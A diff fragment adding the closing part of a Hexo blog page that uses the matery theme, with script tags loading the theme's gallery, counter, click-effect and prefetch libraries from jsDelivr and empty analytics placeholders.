+    <script src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+    
+    <script src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+
+    
+    <script src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/instantpage/instantpage.js" type="module"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+    
+
+</body>
+
+</html>
